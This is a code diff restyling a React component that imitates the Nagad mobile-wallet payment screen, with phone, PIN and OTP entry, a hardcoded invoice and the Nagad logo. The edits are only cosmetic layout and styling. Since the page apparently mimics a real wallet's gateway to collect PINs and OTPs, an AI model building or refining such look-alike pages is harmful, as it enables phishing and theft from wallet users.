@@ -89,11 +89,11 @@ const NagadPayment = () => {
             type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
             onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
             onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
-            className="w-6 h-7 bg-white rounded text-center text-gray-800 text-xs font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
+            className="w-5 h-6 bg-white rounded text-center text-gray-800 text-[10px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
           />
         );
       }
-      elements.push(<div key={groupIndex} className="flex gap-0.5">{inputs}</div>);
+      elements.push(<div key={groupIndex} className="flex gap-1">{inputs}</div>);
       currentIndex += groupSize;
       if (groupIndex < groups.length - 1) {
         elements.push(<span key={`sep-${groupIndex}`} className="text-[#ccc] text-base font-bold mx-0.5">-</span>);
@@ -117,7 +117,7 @@ const NagadPayment = () => {
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
-      <div className="w-full h-screen flex flex-col overflow-hidden border-4 border-black"
+      <div className="w-full h-screen flex flex-col overflow-hidden border-[6px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
       {showFailedView ? (
         <div className="flex-1 flex flex-col items-center justify-center">
@@ -129,11 +129,11 @@ const NagadPayment = () => {
         <div className="flex-1 flex flex-col">
           {/* Language Toggle */}
           <div className="flex justify-end p-2">
-            <div className="flex overflow-hidden border border-white/60">
+            <div className="flex overflow-hidden border border-white/50 rounded-sm">
               <button onClick={() => setLanguage('bn')}
-                className={`px-2.5 py-1 text-xs font-bold transition-colors ${language === 'bn' ? 'bg-white/30 text-white' : 'text-white/80'}`}>বাং</button>
+                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
               <button onClick={() => setLanguage('en')}
-                className={`px-2.5 py-1 text-xs font-bold transition-colors ${language === 'en' ? 'bg-white/30 text-white' : 'text-white/80'}`}>Eng</button>
+                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
             </div>
           </div>
 
@@ -143,18 +143,18 @@ const NagadPayment = () => {
             <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
           </div>
 
-          {/* Invoice Details - centered between title and input */}
-          <div className="flex-1 flex items-center justify-center">
+          {/* Invoice Details - centered vertically, left-aligned */}
+          <div className="flex-1 flex items-center px-8">
             <div className="space-y-1">
-              <div className="flex justify-center">
+              <div className="flex">
                 <span className="text-[#ccc] font-bold text-xs w-28">Invoice No:</span>
                 <span className="text-[#ccc] font-bold text-xs">B255527202718B</span>
               </div>
-              <div className="flex justify-center">
+              <div className="flex">
                 <span className="text-[#ccc] font-bold text-xs w-28">Total Amount:</span>
                 <span className="text-[#ccc] font-bold text-xs">BDT 434</span>
               </div>
-              <div className="flex justify-center">
+              <div className="flex">
                 <span className="text-[#ccc] font-bold text-xs w-28">Charge:</span>
                 <span className="text-[#ccc] font-bold text-xs">BDT 0</span>
               </div>
@@ -162,7 +162,7 @@ const NagadPayment = () => {
           </div>
 
           {/* Input Section */}
-          <div className="px-5 pb-2">
+          <div className="px-5 pb-4 mt-4">
             {showPinView ? (
               <div className="flex flex-col items-center">
                 <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter PIN</p>
@@ -199,10 +199,10 @@ const NagadPayment = () => {
           </div>
 
           {/* Action Buttons */}
-          <div className="px-5 py-2 flex gap-8 justify-center">
+          <div className="px-5 py-2 mt-2 flex gap-8 justify-center">
             <button
               onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
+              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-bold transition-colors hover:bg-transparent hover:text-white border border-white"
             >Proceed</button>
             {showOtpView && (
               <button onClick={() => setOtpValue("")}
@@ -210,15 +210,12 @@ const NagadPayment = () => {
               >Resend Code</button>
             )}
             <button onClick={handleClose}
-              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
+              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-bold transition-colors hover:bg-transparent hover:text-white border border-white"
             >Close</button>
           </div>
 
-          {/* Spacer */}
-          <div className="flex-1" />
-
           {/* White Nagad Logo Footer */}
-          <div className="flex justify-center pb-4">
+          <div className="flex justify-center pb-6 mt-auto">
             <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
           </div>
         </div>
